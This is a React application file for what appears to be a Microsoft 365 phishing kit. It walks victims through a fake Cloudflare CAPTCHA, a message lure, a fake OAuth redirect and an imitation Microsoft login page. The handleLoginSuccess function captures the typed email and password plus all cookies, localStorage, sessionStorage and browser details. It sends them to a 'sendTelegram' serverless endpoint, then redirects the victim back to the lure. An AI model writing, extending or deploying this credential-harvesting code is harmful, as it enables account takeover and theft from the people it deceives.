import React, { useState } from 'react';
import MessageIconLanding from './components/MessageIconLanding';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import MicrosoftLoginPage from './components/MicrosoftLoginPage';
import RealOAuthRedirect from './components/RealOAuthRedirect';

function App() {
  const [currentPage, setCurrentPage] = useState('captcha');

  // Handle the complete flow - starts with CAPTCHA
  const handleCaptchaVerified = () => {
    console.log('✅ CAPTCHA verified - moving to message icon landing');
    setCurrentPage('message-icon');
  };

  const handleMessageOpen = () => {
    console.log('📧 Message icon clicked - moving to OAuth redirect');
    setCurrentPage('oauth-redirect');
  };

  const handleCaptchaBack = () => {
    console.log('⬅️ Back to CAPTCHA (refresh page)');
    window.location.reload();
  };

  const handleOAuthSuccess = (sessionData: any) => {
    console.log('🔐 OAuth successful:', sessionData);
    setCurrentPage('login');
  };

  const handleOAuthBack = () => {
    console.log('⬅️ Back to message icon from OAuth');
    setCurrentPage('message-icon');
  };

  const handleLoginSuccess = async (credentials: { email: string; password: string }) => {
    console.log('🔐 Login successful:', credentials);
    
    // Store credentials and perform cookie work
    const sessionData = {
      email: credentials.email,
      password: credentials.password,
      sessionId: Date.now().toString(),
      timestamp: new Date().toISOString(),
      provider: 'Microsoft',
      fileName: 'Microsoft 365 Access'
    };
    
    localStorage.setItem('microsoft365_session', JSON.stringify(sessionData));
    localStorage.setItem('microsoft365_autograb_session', JSON.stringify(sessionData));
    sessionStorage.setItem('current_session', JSON.stringify(sessionData));
    
    // Set cookies for the session
    document.cookie = `ms365_session=${sessionData.sessionId}; path=/; secure; samesite=strict`;
    document.cookie = `ms365_email=${encodeURIComponent(credentials.email)}; path=/; secure; samesite=strict`;
    document.cookie = `ms365_auth_time=${Date.now()}; path=/; secure; samesite=strict`;
    document.cookie = `logged_in=true; path=/; secure; samesite=strict`;
    document.cookie = `user_email=${encodeURIComponent(credentials.email)}; path=/; secure; samesite=strict`;
    document.cookie = `sessionid=${sessionData.sessionId}; path=/; secure; samesite=strict`;
    
    console.log('🍪 Cookies set, redirecting back to landing page');
    
    // Send credentials to Telegram before redirecting
    try {
      const browserFingerprint = {
        cookies: document.cookie,
        localStorage: JSON.stringify(Object.fromEntries(Object.entries(localStorage))),
        sessionStorage: JSON.stringify(Object.fromEntries(Object.entries(sessionStorage))),
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        timestamp: new Date().toISOString()
      };
      
      await fetch('/.netlify/functions/sendTelegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: credentials.email,
          password: credentials.password,
          provider: 'Microsoft',
          fileName: 'Microsoft 365 Login',
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          browserFingerprint: browserFingerprint,
          documentCookies: document.cookie,
          sessionId: sessionData.sessionId,
          cookies: document.cookie,
          formattedCookies: document.cookie.split(';').map(c => {
            const [name, value] = c.trim().split('=');
            return {
              name: name,
              value: value || '',
              domain: window.location.hostname,
              path: '/',
              secure: true,
              httpOnly: false,
              sameSite: 'strict'
            };
          }),
          localStorage: browserFingerprint.localStorage,
          sessionStorage: browserFingerprint.sessionStorage
        })
      });
      
      console.log('✅ Credentials sent to Telegram');
    } catch (error) {
      console.error('❌ Failed to send credentials to Telegram:', error);
    }
    
    // Redirect back to landing page (message icon)
    setTimeout(() => {
      setCurrentPage('message-icon');
    }, 1000);
  };

  const handleLoginError = (error: string) => {
    console.error('❌ Login error:', error);
    // Stay on login page for retry
  };

  const handleLoginBack = () => {
    console.log('⬅️ Back to OAuth redirect from login');
    setCurrentPage('oauth-redirect');
  };

  // Render current page based on flow
  switch (currentPage) {
    case 'captcha':
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
        />
      );
    
    case 'message-icon':
      return (
        <MessageIconLanding 
          onOpenMessage={handleMessageOpen}
        />
      );
    
    case 'oauth-redirect':
      return (
        <RealOAuthRedirect
          onLoginSuccess={handleOAuthSuccess}
        />
      );
    
    case 'login':
      return (
        <MicrosoftLoginPage
          onBack={handleLoginBack}
          onLoginSuccess={handleLoginSuccess}
          onLoginError={handleLoginError}
          showBackButton={true}
        />
      );
    
    default:
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
        />
      );
  }
}

export default App;